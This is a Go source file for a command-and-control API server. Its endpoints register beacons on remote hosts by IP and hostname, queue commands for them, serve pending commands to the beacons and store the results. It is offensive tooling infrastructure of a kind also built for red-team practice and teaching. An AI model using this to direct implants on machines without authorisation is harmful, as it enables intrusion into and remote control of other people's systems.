package main

import (
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
)

type Beacon struct {
	ID       int32     `json:"id,omitempty"`
	IP       string    `json:"ip"`
	Hostname string    `json:"hostname"`
	Commands []Command `json:"commands,omitempty"`
}

type Command struct {
	ID       int32  `json:"id,omitempty"`
	BeaconID int32  `json:"beacon_id,omitempty"`
	Type     string `json:"type"`
	Arg      string `json:"arg"`
	Executed bool   `json:"executed,omitempty"`
	Result   string `json:"result,omitempty"`
}

type APIServer struct {
	addr string
	db   *sql.DB
}

func GetNewAPIServer() *APIServer {
	db := GetNewDBServer()
	addr, present := os.LookupEnv("C2_API_ADDR")
	if !present {
		addr = "0.0.0.0:8080"
	}
	return &APIServer{
		addr: addr,
		db:   db,
	}
}

// func (s *APIServer) String() string {
// 	return fmt.Sprintf("%s:%d", s.addr, s.port)
// }

func (s *APIServer) CheckBeaconIDExistence(beaconID int32) (bool, error) {
	dbID := beaconID

	row := s.db.QueryRow("SELECT id FROM beacons WHERE id = ?;", beaconID)
	err := row.Scan(&dbID)

	if err == sql.ErrNoRows {
		return false, nil
	} else if err != nil {
		return false, err
	} else if beaconID == dbID {
		return true, nil
	}
	return false, nil
}

func (s *APIServer) GenerateUniqueBeaconID() (int32, error) {
	var id int32
	for {
		id = rand.Int31()
		inDB, err := s.CheckBeaconIDExistence(id)
		if err != nil {
			return id, err
		}
		if !inDB {
			break
		}
	}
	return id, nil
}

func (s *APIServer) RegisterBeacon(beacon Beacon) (int32, error) {
	id, err := s.GenerateUniqueBeaconID()
	if err != nil {
		return -1, err
	}

	_, err = s.db.Exec(
		`INSERT INTO beacons (id, ip, hostname)
		VALUES (?, ?, ?)`,
		id,
		beacon.IP,
		beacon.Hostname,
	)
	if err != nil {
		return -1, err
	}

	return id, nil
}

func (s *APIServer) GetBeacon(beaconID int32) (Beacon, error) {

	row := s.db.QueryRow(
		`SELECT id, ip, hostname
		FROM beacons
		WHERE id = ?;`,
		beaconID,
	)

	beacon := Beacon{}
	err := row.Scan(&beacon.ID, &beacon.IP, &beacon.Hostname)
	if err != nil {
		return Beacon{}, err
	}

	commands, err := s.GetCommands(beaconID, false)
	if err != nil {
		return Beacon{}, err
	}

	beacon.Commands = commands

	return beacon, nil
}

func (s *APIServer) GetCommands(beaconID int32, unexecOnly bool) ([]Command, error) {
	var query string
	if unexecOnly {
		query = `SELECT id, beacon_id,
		c_type, c_arg, executed, result
		FROM commands
		WHERE beacon_id = ?
		AND executed = 0
		ORDER BY create_time;`
	} else {
		query = `SELECT id, beacon_id,
		c_type, c_arg, executed, result
		FROM commands
		WHERE beacon_id = ?
		ORDER BY create_time;`
	}

	rows, err := s.db.Query(query, beaconID)
	if err != nil {
		return []Command{}, err
	}

	commands := []Command{}
	for {
		anotherRow := rows.Next()
		if !anotherRow && rows.Err() != nil {
			return []Command{}, err

		} else if !anotherRow {
			break
		}
		c := Command{}
		rows.Scan(&c.ID, &c.BeaconID, &c.Type,
			&c.Arg, &c.Executed, &c.Result)
		commands = append(commands, c)
	}

	return commands, nil
}

func (s *APIServer) MarkCommandExecuted(commandID int32, result string) error {
	_, err := s.db.Exec(`
		UPDATE commands
		SET executed = 1, result = ?
		WHERE id = ?;
		`, result, commandID)

	if err != nil {
		return err
	}

	return nil
}

func (s *APIServer) DeleteBeacon(id int32) error {
	tx, err := s.db.Begin()
	if err != nil {
		return err
	}

	_, execErr := tx.Exec(`DELETE FROM commands WHERE beacon_id = ?`, id)
	if execErr != nil {
		tx.Rollback()
		return execErr
	}

	_, execErr = tx.Exec(`DELETE FROM beacons WHERE id = ?`, id)
	if execErr != nil {
		tx.Rollback()
		return execErr
	}

	err = tx.Commit()
	if err != nil {
		return err
	}

	return nil
}

func (s *APIServer) RegisterCommand(command Command) error {
	beaconIDExists, err := s.CheckBeaconIDExistence(command.BeaconID)
	if err != nil {
		return err
	}

	if !beaconIDExists {
		return errors.New(fmt.Sprintf("Beacon ID %d doesn't exist", command.BeaconID))
	}

	_, err = s.db.Exec(
		`INSERT INTO commands (beacon_id, c_type, c_arg)
		VALUES (?, ?, ?)`,
		command.BeaconID,
		command.Type,
		command.Arg,
	)
	if err != nil {
		return err
	}

	return nil

}

func (s *APIServer) Run() error {
	router := http.NewServeMux()

	router.HandleFunc("POST /beacon/register", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")

		defer r.Body.Close()
		rBody, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w,
				`{"msg": "no request body"}`,
				http.StatusInternalServerError)
			return
		}

		beacon := Beacon{}
		err = json.Unmarshal(rBody, &beacon)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "json.Unmarshal(%s) failed: %s"}`,
				rBody,
				err.Error()),
				http.StatusInternalServerError)
			return
		}
		beaconID, err := s.RegisterBeacon(beacon)

		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		w.Write(fmt.Appendf(nil,
			`{"msg": "successfully registered", "id": %d}`,
			beaconID))
	})

	router.HandleFunc("GET /beacon/{id}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")
		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		beaconID := int32(id64)

		beacon, err := s.GetBeacon(beaconID)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		body, err := json.Marshal(beacon)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		w.Write(body)
	})

	router.HandleFunc("DELETE /beacon/{id}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")
		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		beaconID := int32(id64)

		err = s.DeleteBeacon(beaconID)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		w.Write(fmt.Appendf(nil, `{"msg": "successfully deleted %d}`, beaconID))
	})

	router.HandleFunc("GET /beacon/{id}/commands", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")
		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		beaconID := int32(id64)

		unexecOnly := false
		if r.URL.Query().Get("unexec_only") == "true" {
			unexecOnly = true
		}

		commands, err := s.GetCommands(beaconID, unexecOnly)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		body, err := json.Marshal(commands)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		w.Write(body)
	})

	router.HandleFunc("POST /command/register", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")

		defer r.Body.Close()
		rBody, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w,
				`{"msg": "no request body"}`,
				http.StatusInternalServerError)
			return
		}

		command := Command{}
		err = json.Unmarshal(rBody, &command)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		err = s.RegisterCommand(command)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		w.Write(fmt.Appendf(nil,
			`{"msg": "successfully added command",
			"id": %d}`,
			command.ID))
	})

	router.HandleFunc("POST /command/{id}/executed", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Content-Type", "application/json")

		id64, err := strconv.ParseInt(r.PathValue("id"), 10, 32)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}
		commandID := int32(id64)

		defer r.Body.Close()
		rBody, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w,
				`{"msg": "no request body"}`,
				http.StatusInternalServerError)
			return
		}

		command := Command{}
		err = json.Unmarshal(rBody, &command)
		if err != nil {
			http.Error(w, fmt.Sprintf(
				`{"msg": "%s"}`, err.Error()),
				http.StatusInternalServerError)
			return
		}

		s.MarkCommandExecuted(commandID, command.Result)

		w.Write(fmt.Appendf(nil,
			`{"msg": "marked command as executed", "id": %d}`,
			command.ID))
	})

	server := http.Server{
		Addr:    s.addr,
		Handler: router,
	}

	log.Printf("API Server ready: %s", s.addr)

	return server.ListenAndServe()
}
